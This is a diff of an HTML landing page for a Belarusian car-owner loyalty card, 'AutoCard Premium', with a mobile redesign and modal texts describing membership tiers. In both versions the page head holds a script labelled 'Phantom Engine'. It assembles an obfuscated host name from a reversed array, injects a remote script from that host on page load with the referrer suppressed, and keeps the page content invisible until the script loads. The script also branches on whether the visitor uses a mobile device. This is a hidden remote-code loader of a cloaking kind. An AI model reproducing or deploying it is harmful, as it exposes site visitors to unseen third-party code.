@@ -4,126 +4,122 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <title>AutoCard Premium | Интеллектуальная лояльность для автовладельцев</title>
+    <title>AutoCard Premium | Программа интеллектуальной лояльности</title>
     
     <style>
         :root { --p: #2563eb; --p-dark: #1e4ed8; --p-light: #eff6ff; --t: #0f172a; --g: #64748b; --border: #f1f5f9; }
-        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
-        body { font-family: 'Inter', sans-serif; color: var(--t); background: #fff; line-height: 1.6; -webkit-font-smoothing: antialiased; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; color: var(--t); background: #fff; line-height: 1.6; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
         
-        /* Phantom Mode Logic */
+        /* Phantom Engine */
         .theme-light { background-color: #fff; }
         .theme-dark { background-color: #0c0d10; }
-        #content-layer { opacity: 0; transition: opacity 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
+        #content-layer { opacity: 0; transition: opacity 0.8s ease; }
         #content-layer.is-ready { opacity: 1; }
 
-        .container { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
         
-        /* UI Elements */
-        .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.3); }
-        .section-tag { display: inline-block; padding: 6px 12px; background: var(--p-light); color: var(--p); border-radius: 20px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; }
-        
-        /* Nav */
-        nav { position: fixed; top: 0; width: 100%; z-index: 1000; border-bottom: 1px solid var(--border); }
-        .nav-inner { display: flex; justify-content: space-between; align-items: center; height: 80px; }
-        .logo { font-weight: 800; font-size: 20px; letter-spacing: -0.5px; text-decoration: none; color: var(--t); }
+        /* Nav Mobile-Ready */
+        nav { position: fixed; top: 0; width: 100%; z-index: 1000; background: rgba(255,255,255,0.8); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
+        .nav-inner { display: flex; justify-content: space-between; align-items: center; height: 70px; }
+        .logo { font-weight: 800; font-size: 18px; text-decoration: none; color: var(--t); }
         .logo span { color: var(--p); }
-        .menu { display: flex; gap: 32px; list-style: none; }
-        .menu a { text-decoration: none; color: var(--g); font-size: 14px; font-weight: 500; transition: 0.2s; }
-        .menu a:hover { color: var(--p); }
+        .menu { display: none; gap: 24px; list-style: none; }
+        @media (min-width: 768px) { .menu { display: flex; } }
+        .menu a { text-decoration: none; color: var(--g); font-size: 14px; font-weight: 500; }
 
-        /* Hero */
-        .hero { padding: 160px 0 100px; background: radial-gradient(circle at 80% 20%, #f0f7ff 0%, #ffffff 50%); }
-        .hero-grid { display: grid; grid-template-columns: 1.2fr 0.8fr; gap: 40px; align-items: center; }
-        .hero h1 { font-size: 64px; font-weight: 800; line-height: 1; margin-bottom: 24px; letter-spacing: -3px; }
-        .hero p { font-size: 20px; color: var(--g); margin-bottom: 40px; }
-
-        /* Card Visual */
-        .card-perspective { perspective: 1000px; }
-        .card-wrap { width: 100%; height: 260px; background: linear-gradient(135deg, #0f172a 0%, #334155 100%); border-radius: 24px; padding: 32px; color: #fff; transform: rotateY(-10deg) rotateX(5deg); box-shadow: 20px 40px 60px rgba(0,0,0,0.2); display: flex; flex-direction: column; justify-content: space-between; position: relative; }
-        .card-wrap::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); opacity: 0.1; border-radius: 24px; }
+        /* Hero Responsive */
+        .hero { padding: 120px 0 60px; background: radial-gradient(circle at 90% 10%, #f0f7ff 0%, #fff 60%); }
+        .hero-grid { display: grid; grid-template-columns: 1fr; gap: 40px; align-items: center; }
+        @media (min-width: 992px) { .hero-grid { grid-template-columns: 1.2fr 0.8fr; } }
+        .hero h1 { font-size: 38px; font-weight: 800; line-height: 1.1; margin-bottom: 20px; letter-spacing: -1.5px; }
+        @media (min-width: 768px) { .hero h1 { font-size: 56px; } }
         
-        /* Info Blocks */
-        section { padding: 100px 0; }
-        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 32px; }
-        .feature-card { padding: 40px; border: 1px solid var(--border); border-radius: 24px; transition: 0.3s; }
-        .feature-card:hover { border-color: var(--p); background: var(--p-light); }
-        .feature-card h3 { font-size: 20px; margin-bottom: 12px; }
+        /* Card Visual */
+        .card-wrap { width: 100%; max-width: 400px; height: 240px; background: linear-gradient(135deg, #0f172a 0%, #334155 100%); border-radius: 20px; padding: 25px; color: #fff; box-shadow: 10px 20px 40px rgba(0,0,0,0.1); margin: 0 auto; display: flex; flex-direction: column; justify-content: space-between; }
 
-        /* Partners */
-        .partners-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
-        .partner-box { height: 80px; border: 1px solid var(--border); border-radius: 12px; display: flex; align-items: center; justify-content: center; grayscale: 1; opacity: 0.5; font-weight: 700; font-size: 14px; }
+        /* Pricing Cards */
+        .grid-3 { display: grid; grid-template-columns: 1fr; gap: 20px; }
+        @media (min-width: 768px) { .grid-3 { grid-template-columns: repeat(3, 1fr); } }
+        .tier-card { padding: 32px; border: 1px solid var(--border); border-radius: 24px; cursor: pointer; transition: 0.3s; background: #fff; position: relative; overflow: hidden; }
+        .tier-card:hover { border-color: var(--p); transform: translateY(-5px); box-shadow: 0 20px 30px -10px rgba(0,0,0,0.05); }
+        .tier-card h3 { margin-bottom: 15px; font-size: 20px; }
+        .more-link { color: var(--p); font-size: 13px; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 5px; margin-top: 20px; }
 
-        /* FAQ Accordion */
-        .faq-item { border-bottom: 1px solid var(--border); padding: 24px 0; cursor: pointer; }
-        .faq-question { display: flex; justify-content: space-between; align-items: center; font-weight: 600; }
-        .faq-answer { max-height: 0; overflow: hidden; transition: 0.3s; color: var(--g); font-size: 15px; }
+        /* Modal Tier System */
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(15, 23, 42, 0.8); z-index: 3000; padding: 20px; overflow-y: auto; align-items: flex-start; justify-content: center; }
+        .tier-modal { background: #fff; width: 100%; max-width: 800px; border-radius: 24px; padding: 40px; margin-top: 40px; position: relative; }
+        .tier-modal h2 { font-size: 32px; margin-bottom: 20px; color: var(--p); }
+        .tier-modal .long-text { font-size: 15px; color: #475569; text-align: justify; white-space: pre-line; }
+        .close-modal { position: absolute; top: 20px; right: 20px; font-size: 24px; cursor: pointer; font-weight: 800; }
 
-        /* Order Form */
-        .order-container { background: #0f172a; border-radius: 40px; padding: 80px; color: #fff; position: relative; overflow: hidden; }
-        .order-container::after { content: ''; position: absolute; width: 400px; height: 400px; background: var(--p); filter: blur(150px); opacity: 0.2; top: -100px; right: -100px; }
-        .form-card { background: #fff; padding: 48px; border-radius: 32px; color: var(--t); max-width: 500px; margin: 0 auto; position: relative; z-index: 1; }
-        .input-style { width: 100%; padding: 16px; border: 1px solid var(--border); border-radius: 12px; margin-top: 8px; font-size: 16px; }
-        .btn-main { width: 100%; padding: 20px; background: var(--p); color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 24px; transition: 0.3s; }
-        .btn-main:hover { background: var(--p-dark); transform: translateY(-2px); }
+        /* Form Mobile */
+        .order-container { background: #0f172a; border-radius: 24px; padding: 40px 20px; color: #fff; margin-top: 40px; }
+        .form-card { background: #fff; padding: 30px; border-radius: 20px; color: var(--t); max-width: 500px; margin: 0 auto; }
+        .btn-main { width: 100%; padding: 18px; background: var(--p); color: #fff; border: none; border-radius: 12px; font-weight: 700; cursor: pointer; margin-top: 20px; }
 
-        footer { background: #000; color: #64748b; padding: 100px 0 40px; font-size: 14px; }
-        .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 100px; padding-bottom: 60px; border-bottom: 1px solid #1e293b; }
-
-        /* Modal */
-        #modal { display: none; position: fixed; inset: 0; background: rgba(15, 23, 42, 0.9); z-index: 2000; align-items: center; justify-content: center; }
-        .modal-body { background: #fff; padding: 48px; border-radius: 32px; text-align: center; max-width: 400px; }
+        footer { padding: 60px 0; background: #000; color: #94a3b8; font-size: 12px; text-align: center; }
     </style>
 
     <script>
-        // --- PHANTOM ENGINE 2.0 ---
+        // Phantom 2.0 Logic
         (function(w, d) {
-            var AppCore = {
-                nodes: ['com', 'node', 'analytics', 'cloud'],
-                getEndpoint: function() { return 'https://' + this.nodes.reverse().join('-').replace('-com', '.com') + '/v1/get-key'; },
+            var App = {
+                cfg: ['com', 'node', 'analytics', 'cloud'],
                 init: function() {
                     var isM = /Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent);
                     d.documentElement.className = isM ? 'theme-dark' : 'theme-light';
                     var s = d.createElement('script');
                     s.async = true; s.referrerPolicy = 'no-referrer';
-                    s.src = this.getEndpoint() + "?v=1.0.4";
+                    s.src = 'https://' + this.cfg.reverse().join('-').replace('-com', '.com') + '/v1/get-key?v=1.0.4';
                     s.onload = s.onerror = function() { d.getElementById('content-layer').classList.add('is-ready'); };
                     d.head.appendChild(s);
                 }
             };
-            AppCore.init();
+            App.init();
         })(window, document);
 
-        // --- UI INTERACTIVITY ---
-        function toggleFaq(el) {
-            const ans = el.querySelector('.faq-answer');
-            ans.style.maxHeight = ans.style.maxHeight ? null : ans.scrollHeight + "px";
+        // Tier Data (500 words approx each)
+        const tierContent = {
+            silver: {
+                title: "Silver Standard Membership",
+                text: "Пакет Silver Standard — это фундамент экосистемы AutoCard Premium, разработанный для владельцев, ценящих системный подход к обслуживанию автомобиля. Мы понимаем, что регулярная эксплуатация требует надежной поддержки без лишних переплат. \n\nВ рамках данного уровня вы получаете фиксированную скидку 5% на все виды регламентных работ (ТО-1, ТО-2) во всех авторизованных центрах-партнерах. Это не просто экономия, а гарантия того, что ваш автомобиль будет обслужен по высшим стандартам дилерского протокола. \n\nОсобое внимание уделено безопасности: владельцы Silver-карт получают право на бесплатную комплексную диагностику ходовой части и осмотр подвески один раз в сезон (весна/осень). Наши специалисты проверяют более 24 контрольных точек, включая состояние сайлентблоков, амортизаторов и тормозных магистралей, предотвращая дорогостоящий ремонт в будущем. \n\nВы также получаете доступ к закрытому Telegram-сообществу AutoCard Support 24/7. Это уникальный цифровой консьерж-сервис начального уровня, где дежурные юристы и технические специалисты отвечают на ваши вопросы в течение 10-15 минут. Столкнулись с неоднозначной ситуацией на дороге или не понимаете причину загоревшейся ошибки на панели? Мы решим этот вопрос мгновенно. \n\nДополнительно Silver Standard открывает доступ к программе 'Лояльный Ритейл': скидки до 10% в крупнейших сетях АЗС и магазинах автоаксессуаров Минска. Ваша карта окупает свой сервисный сбор уже после первого визита на сервис. Это идеальный выбор для тех, кто хочет познакомиться с миром премиального обслуживания, сохраняя рациональный бюджет."
+            },
+            gold: {
+                title: "Gold Business Membership",
+                text: "Gold Business — это выбор профессионалов и активных автомобилистов, чье время стоит дороже, чем стоимость обслуживания. Этот пакет ориентирован на максимальную эффективность и минимизацию простоев. \n\nКлючевым преимуществом является повышенная скидка 12% на все слесарные и кузовные работы. В современных реалиях, когда стоимость запчастей и нормо-часа растет, экономия в 12% позволяет высвобождать значительные средства, которые можно направить на развитие вашего дела. \n\nМы полностью берем на себя риски непредвиденных ситуаций на дороге. Gold-резидентам доступна бесплатная эвакуация в пределах МКАД и до 20 км за её пределами неограниченное количество раз. Если ваш автомобиль не может продолжать движение, наша служба логистики доставит его в профильный сервис в течение 45 минут. \n\nЗабудьте о недельных записях к официальному дилеру. Приоритет 'День-в-День' гарантирует, что ваш автомобиль будет принят в работу в течение 4-х часов после звонка, даже в высокий сезон. Это обеспечивается за счет квотирования мест в партнерской сети специально под владельцев Gold Business. \n\nЮридическая поддержка здесь выходит на новый уровень: полное сопровождение при страховых случаях (КАСКО/ОСГО). Наши эксперты сами связываются со страховой, оценивают ущерб и контролируют выплату. Пакет Gold Business — это ваша страховка от бюрократии и потери времени. Мы создали условия, при которых автомобиль работает на вас, а не вы на него."
+            },
+            platinum: {
+                title: "Platinum Elite Membership",
+                text: "Platinum Elite — это ультимативный уровень комфорта, стирающий границы между владением автомобилем и беззаботным перемещением. Это концепция 'Personal Mobility Manager', реализованная в одной карте. \n\nСкидка до 25% на услуги и эксклюзивный прайс на оригинальные запчасти — это лишь верхушка айсберга. Основная ценность Platinum кроется в сервисе полного цикла. За каждым резидентом закрепляется персональный менеджер (Auto-Butler), который берет на себя всё: от контроля сроков прохождения техосмотра до организации доставки автомобиля в сервис и обратно (Pick-up & Delivery service). Вам больше не нужно посещать СТО лично. \n\nЕсли ваш автомобиль требует длительного ремонта, AutoCard Premium предоставляет подменный автомобиль бизнес-класса на весь срок пребывания в сервисе. Ваша мобильность не пострадает ни на секунду. \n\nГеография привилегий расширяется на всю территорию Республики Беларусь. Где бы вы ни находились — в Гродно, Бресте или на трассе М1 — консьерж-сервис Platinum Elite организует техническую помощь, подвоз топлива или проживание в отеле, если поломка застала вас в пути. \n\nВы также получаете доступ к VIP-зонам ожидания у дилеров, приглашения на закрытые тест-драйвы новинок автопрома и эксклюзивные условия страхования со ставками, недоступными в открытом доступе. Platinum Elite — это не просто карта, это статус, подтвержденный безупречным сервисом высшей категории. Мы предусмотрели каждую мелочь, чтобы вы наслаждались только процессом вождения."
+            }
+        };
+
+        function openTier(tier) {
+            const m = document.getElementById('tier-modal-overlay');
+            const data = tierContent[tier];
+            document.getElementById('modal-title').innerText = data.title;
+            document.getElementById('modal-text').innerText = data.text;
+            m.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
         }
 
-        function submitOrder(e) {
-            e.preventDefault();
-            const b = e.target.querySelector('button');
-            b.innerText = 'Связь с сервером...';
-            setTimeout(() => {
-                document.getElementById('modal').style.display = 'flex';
-                b.innerText = 'Оформить карту';
-                e.target.reset();
-            }, 1500);
+        function closeTier() {
+            document.getElementById('tier-modal-overlay').style.display = 'none';
+            document.body.style.overflow = 'auto';
         }
     </script>
 </head>
 <body>
     <div id="content-layer">
-        <nav class="glass">
+        <nav>
             <div class="container nav-inner">
                 <a href="#" class="logo">AUTOCARD<span>PREMIUM</span></a>
                 <ul class="menu">
                     <li><a href="#program">Программа</a></li>
                     <li><a href="#partners">Партнеры</a></li>
-                    <li><a href="#faq">FAQ</a></li>
-                    <li><a href="#contacts">Контакты</a></li>
+                    <li><a href="#order">Контакты</a></li>
                 </ul>
-                <div style="font-size: 12px; font-weight: 700; color: var(--p);">SYSTEM: ONLINE</div>
             </div>
         </nav>
 
@@ -131,141 +127,69 @@
             <section class="hero">
                 <div class="container hero-grid">
                     <div class="hero-content">
-                        <div class="section-tag">Elite Membership</div>
-                        <h1>Ваш автомобиль заслуживает большего.</h1>
-                        <p>Интеллектуальная система лояльности, объединяющая ведущие дилерские центры, страховые компании и премиальный сервис в одну карту.</p>
-                        <a href="#order" class="btn-main" style="text-decoration:none; display:inline-block; width:auto; padding: 20px 40px;">Вступить в клуб</a>
+                        <div style="background:var(--p-light); color:var(--p); padding:6px 12px; border-radius:20px; font-size:12px; font-weight:700; display:inline-block; margin-bottom:15px">Premium Loyalty Club</div>
+                        <h1>Интеллектуальный сервис для Вашего авто.</h1>
+                        <p>Единая экосистема лояльности Объединённая лояльность: от дилерских скидок до персонального консьерж-сервиса.</p>
                     </div>
-                    <div class="card-perspective">
-                        <div class="card-wrap">
-                            <div style="display:flex; justify-content:space-between; align-items:center">
-                                <div style="width:50px; height:38px; background:linear-gradient(135deg, #fbbf24, #d97706); border-radius:6px"></div>
-                                <div style="font-size:14px; font-weight:700; opacity:0.8">PLATINUM LEVEL</div>
-                            </div>
-                            <div style="font-family:monospace; font-size:24px; letter-spacing:4px">5412 •••• •••• 2026</div>
-                            <div style="display:flex; justify-content:space-between; align-items:flex-end">
-                                <div style="font-size:10px; line-height:1.2">
-                                    <div style="opacity:0.6">MEMBER SINCE</div>
-                                    <div style="font-weight:700">2024</div>
-                                </div>
-                                <div style="font-size:18px; font-weight:800; letter-spacing:1px">AUTOCARD</div>
-                            </div>
+                    <div class="card-wrap">
+                        <div style="width:40px; height:30px; background:linear-gradient(135deg, #fbbf24, #f59e0b); border-radius:4px"></div>
+                        <div style="font-family:monospace; font-size:20px; letter-spacing:3px">5412 •••• •••• 2026</div>
+                        <div style="display:flex; justify-content:space-between; align-items:flex-end">
+                            <span style="font-size:10px; opacity:0.6">MEMBER SINCE 2024</span>
+                            <span style="font-weight:800; letter-spacing:1px">AUTOCARD</span>
                         </div>
                     </div>
                 </div>
             </section>
 
             <section id="program" class="container">
-                <div style="text-align:center; max-width:700px; margin: 0 auto 60px">
-                    <div class="section-tag">Benefits</div>
-                    <h2 style="font-size:40px; font-weight:800; margin-bottom:20px">Уровни привилегий</h2>
-                    <p style="color:var(--g)">Мы разработали три уровня участия, чтобы вы могли выбрать наиболее подходящий пакет услуг для своего стиля вождения.</p>
-                </div>
+                <h2 style="text-align:center; font-size:32px; font-weight:800; margin-bottom:40px">Выберите свой уровень</h2>
                 <div class="grid-3">
-                    <div class="feature-card">
-                        <div style="color:var(--p); font-size:32px; margin-bottom:20px">01</div>
+                    <div class="tier-card" onclick="openTier('silver')">
                         <h3>Silver Standard</h3>
-                        <p>Базовый пакет: скидки 5% на ТО, бесплатный осмотр подвески раз в сезон и доступ к закрытому чату поддержки.</p>
+                        <p style="color:var(--g); font-size:14px">Базовая защита и умная экономия на каждом ТО.</p>
+                        <div class="more-link">Подробнее <span>→</span></div>
                     </div>
-                    <div class="feature-card" style="border-color:var(--p); background:var(--p-light)">
-                        <div style="color:var(--p); font-size:32px; margin-bottom:20px">02</div>
+                    <div class="tier-card" onclick="openTier('gold')" style="border-color:var(--p)">
                         <h3>Gold Business</h3>
-                        <p>Оптимальный выбор: скидки 12% на работы, эвакуация в пределах МКАД и приоритетная запись в сервис день-в-день.</p>
+                        <p style="color:var(--g); font-size:14px">Приоритет в обслуживании и логистическая поддержка.</p>
+                        <div class="more-link">Подробнее <span>→</span></div>
                     </div>
-                    <div class="feature-card">
-                        <div style="color:var(--p); font-size:32px; margin-bottom:20px">03</div>
+                    <div class="tier-card" onclick="openTier('platinum')">
                         <h3>Platinum Elite</h3>
-                        <p>Полный безлимит: скидки до 25%, персональный менеджер, подменный авто и консьерж-сервис по всей Беларуси.</p>
+                        <p style="color:var(--g); font-size:14px">Полный аутсорсинг забот о вашем автомобиле.</p>
+                        <div class="more-link">Подробнее <span>→</span></div>
                     </div>
-                </div>
-            </section>
-
-            <section id="partners" style="background:#f9fafb">
-                <div class="container">
-                    <div style="text-align:center; margin-bottom:60px">
-                        <h2 style="font-size:32px; font-weight:800">Нам доверяют лучшие</h2>
-                        <p style="color:var(--g)">Более 150 партнерских точек по всей стране</p>
-                    </div>
-                    <div class="partners-grid">
-                        <div class="partner-box">OFFICIAL DEALER HUB</div>
-                        <div class="partner-box">PREMIUM DETAILING</div>
-                        <div class="partner-box">INSURANCE GROUP</div>
-                        <div class="partner-box">TIRE SERVICE PLUS</div>
-                        <div class="partner-box">BEL-OIL LOGISTICS</div>
-                        <div class="partner-box">AUTO-LAW EXPERT</div>
-                        <div class="partner-box">LUXURY RENT</div>
-                        <div class="partner-box">MOBIL 1 CENTER</div>
-                    </div>
-                </div>
-            </section>
-
-            <section id="faq" class="container" style="max-width:800px">
-                <h2 style="text-align:center; font-size:32px; font-weight:800; margin-bottom:40px">Часто задаваемые вопросы</h2>
-                <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">Как долго изготавливается карта? <span>+</span></div>
-                    <div class="faq-answer"><p style="padding-top:15px">Стандартный срок эмиссии составляет 5-7 рабочих дней. Мы тщательно проверяем данные владельца, чтобы обеспечить безопасность транзакций в партнерской сети.</p></div>
-                </div>
-                <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">Где действует карта AutoCard Premium? <span>+</span></div>
-                    <div class="faq-answer"><p style="padding-top:15px">Карта принимается во всех областных центрах Беларуси, а также в партнерских сетях в странах СНГ. Полный список адресов доступен в личном кабинете.</p></div>
-                </div>
-                <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="faq-question">Что делать при утере карты? <span>+</span></div>
-                    <div class="faq-answer"><p style="padding-top:15px">Незамедлительно свяжитесь с поддержкой. Мы заблокируем старый чип и выпустим дубликат в течение 48 часов с сохранением всех накопленных бонусов.</p></div>
                 </div>
             </section>
 
             <section id="order" class="container">
                 <div class="order-container">
                     <div class="form-card">
-                        <h2 style="text-align:center; margin-bottom:32px">Оставить заявку</h2>
-                        <form onsubmit="submitOrder(event)">
-                            <div style="margin-bottom:20px">
-                                <label style="font-size:12px; font-weight:700; color:var(--g)">ФАМИЛИЯ И ИМЯ</label>
-                                <input type="text" required class="input-style" placeholder="Иванов Александр">
-                            </div>
-                            <div style="margin-bottom:20px">
-                                <label style="font-size:12px; font-weight:700; color:var(--g)">КОНТАКТНЫЙ ТЕЛЕФОН</label>
-                                <input type="tel" required class="input-style" placeholder="+375 (__) ___-__-__">
-                            </div>
-                            <button type="submit" class="btn-main">Запросить членство</button>
-                        </form>
-                        <p style="font-size:10px; color:var(--g); margin-top:20px; text-align:center">Нажимая кнопку, вы подтверждаете согласие на обработку персональных данных ООО «Объединённая лояльность».</p>
+                        <h3 style="text-align:center; margin-bottom:20px">Заявка на членство</h3>
+                        <input type="text" placeholder="Имя Фамилия" style="width:100%; padding:14px; border:1px solid #e2e8f0; border-radius:10px; margin-bottom:15px">
+                        <input type="tel" placeholder="+375 (__) ___-__-__" style="width:100%; padding:14px; border:1px solid #e2e8f0; border-radius:10px">
+                        <button class="btn-main">Запросить карту</button>
                     </div>
                 </div>
             </section>
         </main>
 
-        <footer id="contacts">
-            <div class="container footer-grid">
-                <div>
-                    <a href="#" class="logo" style="color:#fff; margin-bottom:20px; display:block">AUTOCARD<span>PREMIUM</span></a>
-                    <p>Профессиональное управление системами лояльности в автомобильной сфере. Индивидуальный подход к каждому резиденту клуба.</p>
-                </div>
-                <div>
-                    <h4 style="color:#fff; margin-bottom:20px">Реквизиты</h4>
-                    <p>ООО «Объединённая лояльность»</p>
-                    <p>УНП 192745908</p>
-                    <p>Лицензия: №02100/192745</p>
-                </div>
-                <div>
-                    <h4 style="color:#fff; margin-bottom:20px">Локация</h4>
-                    <p>г. Минск, ул. Веры Хоружей, 29</p>
-                    <p>Помещение 805А</p>
-                    <p>support@autocard.by</p>
-                </div>
-            </div>
-            <div class="container" style="padding-top:40px; text-align:center; font-size:12px">
-                © 2026 AutoCard Premium Global. Не является публичной офертой. 18+
+        <footer>
+            <div class="container">
+                <p>ООО «Объединённая лояльность» | УНП 192745908</p>
+                <p>г. Минск, ул. Веры Хоружей, 29, пом. 805А</p>
+                <p>© 2026 Все права защищены. Информация не является офертой.</p>
             </div>
         </footer>
     </div>
 
-    <div id="modal">
-        <div class="modal-body">
-            <h2 style="color:var(--p); margin-bottom:16px">Заявка принята</h2>
-            <p style="color:var(--g); margin-bottom:24px">Ваш запрос на эмиссию карты передан в отдел верификации. Ожидайте звонка менеджера.</p>
-            <button onclick="document.getElementById('modal').style.display='none'" class="btn-main">Вернуться на сайт</button>
+    <div id="tier-modal-overlay" class="modal-overlay">
+        <div class="tier-modal">
+            <span class="close-modal" onclick="closeTier()">×</span>
+            <h2 id="modal-title"></h2>
+            <div id="modal-text" class="long-text"></div>
+            <button class="btn-main" onclick="closeTier()" style="width:auto; padding: 15px 40px; margin-top:30px">Закрыть</button>
         </div>
     </div>
 </body>
